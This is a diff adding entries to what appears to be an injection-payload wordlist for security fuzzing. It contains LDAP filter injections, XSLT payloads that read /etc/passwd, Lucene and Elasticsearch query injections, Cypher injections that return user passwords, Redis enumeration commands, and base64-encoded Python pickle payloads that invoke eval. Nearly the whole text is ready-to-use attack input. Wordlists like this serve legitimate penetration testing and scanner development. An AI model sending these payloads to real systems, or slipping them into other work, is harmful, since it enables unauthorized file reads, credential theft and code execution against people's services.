@@ -339,6 +339,28 @@ CONFIG GET *
 INFO
 KEYS *
 String.Format("{0}",1337)
+*)(uid=*))(|(uid=*
+admin)(|(objectClass=*
+*))%00
+admin)(&)
+*)(uid=admin
+admin)(cn=admin))(&(uid=admin
+<xsl:value-of select="document('/etc/passwd')"/>
+<xsl:copy-of select="document('/etc/passwd')"/>
+<xsl:value-of select="unparsed-text('/etc/passwd')"/>
+<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+_exists_:name
+*:*
+name:admin OR _exists_:role
+id:1337 OR id:>0
+name:/.*admin.*/
+' OR '1'='1' //
+admin'//
+' OR 1=1 RETURN u.password //
+') OR 1=1 RETURN u.password AS x //
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
 gAJjX19idWlsdGluX18KZXZhbApxAFgFAAAANyoxOTFxAYVxAlJxAy4=
 gASVIQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwFNyoxOTGUhZRSlC4=
